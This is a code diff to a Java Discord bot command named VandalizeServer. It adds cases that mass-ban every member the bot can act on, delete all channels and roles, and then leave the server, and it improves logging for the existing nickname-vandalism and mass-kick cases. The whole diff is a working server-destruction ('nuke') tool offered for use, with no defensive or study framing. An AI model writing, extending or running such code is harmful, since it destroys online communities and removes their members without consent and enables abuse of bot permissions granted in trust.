@@ -39,39 +39,113 @@ public class VandalizeServer extends Command{
                 theGuild.getMembers().forEach(member -> {
                     if(self.canInteract(member) && !((member.getNickname() == null) ? member.getUser().getName() : member.getNickname()).toLowerCase().endsWith(suffix.toLowerCase())){
                         member.modifyNickname(((member.getNickname() == null) ? member.getUser().getName() : member.getNickname()) + suffix).queue(
-                        (e) -> System.out.println("ok"), 
+                        (e) -> System.out.println("ok - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())), 
                         new ErrorHandler().handle(
                             ErrorResponse.MISSING_PERMISSIONS,
-                                (e) -> System.out.println("Sorry, " + e.getMessage()))
+                                (e) -> System.out.println("no - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())))
                         );
                     }
                 });
+                System.out.println("all done");
                 break;
+
             case "desuffix":
                 String desuffix = args[2];
                 theGuild.getMembers().forEach(member -> {
                     if(self.canInteract(member) && ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname()).toLowerCase().endsWith(desuffix.toLowerCase())){
                         member.modifyNickname(((member.getNickname() == null) ? member.getUser().getName() : member.getNickname()).substring(0, ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname()).length()- desuffix.length())).queue(
-                        (e) -> System.out.println("ok"), 
+                        (e) -> System.out.println("ok - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())), 
                         new ErrorHandler().handle(
                             ErrorResponse.MISSING_PERMISSIONS,
-                                (e) -> System.out.println("Sorry, " + e.getMessage()))
+                                (e) -> System.out.println("no - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())))
                         );
                     }
                 });
+                System.out.println("all done");
                 break;
 
             case "kick":
                 theGuild.getMembers().forEach(member -> {
                     if(self.canInteract(member)){
                         member.kick().queue(
-                        (e) -> System.out.println("ok"), 
+                        (e) -> System.out.println("ok - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())), 
                         new ErrorHandler().handle(
                             ErrorResponse.MISSING_PERMISSIONS,
-                                (e) -> System.out.println("Sorry, " + e.getMessage()))
+                                (e) -> System.out.println("no -  " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())))
                         );
                     }
                 });
+                System.out.println("all done");
+                break;
+
+            case "ban":
+                String reason = args[2];
+                theGuild.getMembers().forEach(member -> {
+                    if(self.canInteract(member)){
+                        member.ban(9999, reason).queue(
+                        (e) -> System.out.println("ok - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())), 
+                        new ErrorHandler().handle(
+                            ErrorResponse.MISSING_PERMISSIONS,
+                                (e) -> System.out.println("no - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())))
+                        );
+                    }
+                });
+                System.out.println("all done");
+                break;
+
+            case "channel":
+                theGuild.getChannels().forEach(channel -> {
+                    channel.delete().queue(
+                    (e) -> System.out.println("ok - " + channel.getName()), 
+                    new ErrorHandler().handle(
+                        ErrorResponse.MISSING_PERMISSIONS,
+                            (e) -> System.out.println("no - " + channel.getName()))
+                    );
+                });
+                System.out.println("all done");
+                break;
+
+            case "break":
+                theGuild.getChannels().forEach(channel -> {
+                    channel.delete().queue(
+                    (e) -> System.out.println("ok - " + channel.getName()), 
+                    new ErrorHandler().handle(
+                        ErrorResponse.MISSING_PERMISSIONS,
+                            (e) -> System.out.println("no - " + channel.getName()))
+                    );
+                });
+                System.out.println("channels deleted");
+
+                theGuild.getRoles().forEach(role -> {
+                    if(self.canInteract(role)){
+                        role.delete().queue(
+                        (e) -> System.out.println("ok - " + role.getName()),
+                        new ErrorHandler().handle(
+                            ErrorResponse.MISSING_PERMISSIONS,
+                                (e) -> System.out.println("no - " + role.getName()))
+                        );
+                    }
+                });
+                System.out.println("roles deleted");
+
+                theGuild.getMembers().forEach(member -> {
+                    if(self.canInteract(member)){
+                        member.ban(9999).queue(
+                        (e) -> System.out.println("ok - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())), 
+                        new ErrorHandler().handle(
+                            ErrorResponse.MISSING_PERMISSIONS,
+                                (e) -> System.out.println("no - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())))
+                        );
+                    }
+                });
+                System.out.println("members banned");
+
+                theGuild.leave().queue();
+                System.out.println("all done");
+                break;
+
+            case "escape":
+                theGuild.leave().queue();
                 break;
         
             default:
